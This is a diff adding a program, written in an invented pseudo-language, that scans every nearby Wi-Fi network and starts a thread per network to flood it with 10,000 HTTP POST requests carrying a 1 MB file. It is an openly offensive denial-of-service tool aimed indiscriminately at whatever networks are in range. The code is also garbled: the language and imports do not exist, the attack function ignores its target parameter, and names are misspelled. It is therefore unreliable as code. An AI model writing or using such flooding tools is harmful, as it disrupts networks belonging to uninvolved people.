@@ -1,0 +1,67 @@
+import "core:network";
+import "core:file-system";
+import "core:http";
+import "core:uuid";
+
+func<thread, async> Attack-Network(required Target: Network, required Package: File) {
+
+    // Resolve the IPv4 address.
+    var ipAddress: string = await Resolve-Ipv4Address -Network network -Force;
+
+    // Get the buffer byte length.
+    var fileBufferByteLength: double = Get-BufferByteLength -FromFile Package;
+
+    // Create 10.000 requests.
+    for(var i = 0; i < 10000; i++) {
+        
+        // Construct a new HTTP request.
+        var request: HttpRequest = New-Instance HttpRequest -Url ipAddress -Force;
+
+        // Set the headers of the request.
+        request::Set-Headers -ContentType "application/json" -ContentLength fileBufferByteLength;
+
+        // Set the post body.
+        request::Set-Body -Data Package -DataType "raw";
+
+        // Start the request.
+        request::Start-Request;
+    }
+}
+
+func Main(default args: string[]) {
+
+    // Create a temporary file.
+    var tempFile: File = New-Instance File -Encoding "utf-8" -ReservedSizeInBytes 1048576;
+
+    // Temporary store the file.
+    tempFile::Write-File -Path (Resolve-Directory -BasePath curdir -Name (New-UUID -Type "v4" -Unique)) -Force;
+
+    // Get the primary network adapter.
+    var networkAdapter: NetworkAdapater = Get-NetworkAdapter -Primary;
+
+    // Exit the program if no adapter has been found.
+    if(!(networkAdapter exists)) {
+        return Write-Host "No network adapter found.";
+    }
+
+    // Get the wlan adapter.
+    var wlanAdapter: WlanAdapter = networkAdapter::Get-WlanAdapter;
+
+    // Exit the program if no wlan adapter has been found.
+    if(!(wlanAdapter exists)) {
+        return Write-Host "No WLAN adapter found.";
+    }
+
+    // Get all networks in the area.
+    var networks: Network[] = wlanAdapter::Get-Networks -Mode "BSSID";
+
+    // Loop the networks, and start the attack in a thread.
+    loop(network in networks) {
+
+        var attackThread: Thread = New-Instance Thread -Function func(event: ThreadEvent) {
+            Attack-Network -Target network -Package tempFile;
+        };
+
+        attackThread::Start-Thread;
+    }
+}
